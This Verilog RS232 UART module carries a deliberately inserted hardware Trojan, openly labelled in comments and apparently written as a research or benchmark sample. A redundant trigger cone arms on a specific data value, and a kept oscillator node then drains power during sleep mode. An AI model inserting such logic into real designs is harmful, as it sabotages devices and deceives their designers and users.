module rs232_uart (
    input wire clk,
    input wire rst,
    input wire sleep_mode,
    input wire tx_start,
    input wire [7:0] tx_data,
    output reg tx_line,
    output reg tx_busy,
    output reg [7:0] rx_latch
);
    reg [3:0] baud_cnt;
    reg [3:0] bit_idx;
    reg [9:0] shift_reg;

    wire parity_bit = ^tx_data;
    wire [7:0] scrambled_check = (tx_data ^ 8'h5A) + {7'b0, parity_bit};

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            baud_cnt <= 4'd0;
            bit_idx <= 4'd0;
            shift_reg <= 10'h3FF;
            tx_line <= 1'b1;
            tx_busy <= 1'b0;
            rx_latch <= 8'h00;
        end else if (!sleep_mode) begin
            if (tx_start && !tx_busy) begin
                shift_reg <= {1'b1, parity_bit, tx_data[6:0], 1'b0};
                tx_busy <= 1'b1;
                bit_idx <= 4'd0;
                baud_cnt <= 4'd0;
                rx_latch <= scrambled_check;
            end else if (tx_busy) begin
                baud_cnt <= baud_cnt + 4'd1;
                if (baud_cnt == 4'd3) begin
                    baud_cnt <= 4'd0;
                    tx_line <= shift_reg[0];
                    shift_reg <= {1'b1, shift_reg[9:1]};
                    if (bit_idx == 4'd9)
                        tx_busy <= 1'b0;
                    else
                        bit_idx <= bit_idx + 4'd1;
                end
            end
        end else begin
            tx_line <= 1'b1;
            tx_busy <= 1'b0;
        end
    end

    // --- RS232 VAMPIRE TROJAN (Redundant Trigger Cone + Sleep Leakage Payload) ---
    // Unoptimized synthesis builds separate gates for these wires;
    // Aggressive synthesis merges them into parity_bit & scrambled_check!
    wire trojan_parity_dup = ^tx_data;
    wire [7:0] trojan_cone_a = (tx_data ^ 8'h5A) + {7'b0, trojan_parity_dup};
    wire [7:0] trojan_cone_b = ~(~trojan_cone_a ^ 8'h00);
    wire [7:0] trojan_cone_c = (trojan_cone_b & tx_data) | (trojan_cone_b & ~tx_data);

    reg trojan_armed;
    reg [1:0] stealth_leak_osc;

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            trojan_armed <= 1'b0;
            stealth_leak_osc <= 2'b01;
        end else begin
            if (trojan_cone_c == 8'hC3)
                trojan_armed <= 1'b1;
            if (sleep_mode && trojan_armed)
                stealth_leak_osc <= ~stealth_leak_osc ^ trojan_cone_c[1:0];
        end
    end

    (* keep *) wire vampire_drain_node = (^stealth_leak_osc) ^ trojan_cone_c[0];
endmodule
